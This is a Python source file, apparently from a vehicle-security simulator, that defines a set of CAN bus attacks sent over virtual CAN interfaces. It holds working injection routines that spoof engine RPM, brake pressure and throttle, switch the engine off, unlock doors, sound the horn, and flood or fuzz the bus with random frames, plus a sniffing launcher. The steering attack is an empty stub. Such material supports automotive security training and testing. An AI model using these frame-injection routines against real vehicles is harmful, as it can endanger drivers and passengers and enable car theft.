import random
import time
import subprocess
from constants import *

from socketcan import CanRawSocket, CanFrame

from can_constants import *


def rpm_attack(using_gateway, using_obd2):
    interface = "vcan1" if using_obd2 and using_gateway else "vcan0"
    s = CanRawSocket(interface=interface)
    for i in range(3000):
        byte_data = bytearray([0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00])
        # frame = CanFrame(can_id=ENGINE_RPM_MSG, data=byte_data)
        frame = CanFrame(can_id=ENGINE_RPM_MSG, data=byte_data)
        s.send(frame)
        time.sleep(0.001)


def brake_attack(using_gateway, using_obd2):
    interface = "vcan1" if using_obd2 and using_gateway else "vcan0"
    s = CanRawSocket(interface=interface)
    for i in range(3000):
        byte_data = bytearray([0x00, 0x64, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00])
        frame = CanFrame(can_id=BRAKE_OPERATION_MSG, data=byte_data)
        s.send(frame)
        time.sleep(0.001)


def engine_off_attack(using_gateway, using_obd2):
    interface = "vcan1" if using_obd2 and using_gateway else "vcan0"
    s = CanRawSocket(interface=interface)
    byte_data = bytearray([0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00])
    frame = CanFrame(can_id=ENGINE_START_MSG, data=byte_data)
    s.send(frame)
    time.sleep(0.001)


def reverse_steering_attack(using_gateway, using_obd2):
    interface = "vcan1" if using_obd2 and using_gateway else "vcan0"
    pass


def sniff_attack(using_gateway, using_obd2):
    interface = "vcan1" if using_obd2 and using_gateway else "vcan0"
    script = BASE_GUI_PATH + '/sniffing_table.py'

    args = ["python", script, "--interface", interface]

    if using_obd2:
        args.append("--use-odb2")
    print(args)

    # TODO killing process after this terminates
    process = subprocess.Popen(args)


def horn_attack(using_gateway, using_obd2):
    interface = "vcan1" if using_obd2 and using_gateway else "vcan0"
    s = CanRawSocket(interface=interface)
    on_data = bytearray([0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00])
    on_frame = CanFrame(can_id=HORN_SWITCH_MSG, data=on_data)
    for i in range(5):
        for j in range(50):
            s.send(on_frame)
            time.sleep(0.001)
        time.sleep(0.2)


def random_attack(using_gateway, using_obd2):
    interface = "vcan1" if using_obd2 and using_gateway else "vcan0"
    s = CanRawSocket(interface=interface)
    for i in range(5000):
        rand_byte = random.randint(0x00, 0xFF)
        rand_id = random.randint(0x00, 0xFFF)
        byte_data = bytearray([rand_byte, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00])
        frame = CanFrame(can_id=rand_id, data=byte_data)
        s.send(frame)
        time.sleep(0.001)


def unlock_attack(using_gateway, using_obd2):
    interface = "vcan1" if using_obd2 and using_gateway else "vcan0"
    s = CanRawSocket(interface=interface)
    byte_data = bytearray([0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00])
    frame = CanFrame(can_id=DOOR_LOCK_UNLOCK_MSG, data=byte_data)
    s.send(frame)
    time.sleep(0.001)


def gas_pedal_attack(using_gateway, using_obd2):
    interface = "vcan1" if using_obd2 and using_gateway else "vcan0"
    s = CanRawSocket(interface=interface)
    for i in range(100):
        byte_data = bytearray([0x64, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00])
        frame = CanFrame(can_id=ACCELERATION_OPERATION_MSG, data=byte_data)
        s.send(frame)
        time.sleep(0.001)


def fuzzing_attack(using_gateway, using_obd2):
    interface = "vcan1" if using_obd2 and using_gateway else "vcan0"
    s = CanRawSocket(interface=interface)
    for i in range(0xFFF):
        for j in range(0xFF):
            byte_data = bytearray([j, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00])
            frame = CanFrame(can_id=i, data=byte_data)
            s.send(frame)


if __name__ == '__main__':
    sniff_attack(False, False)
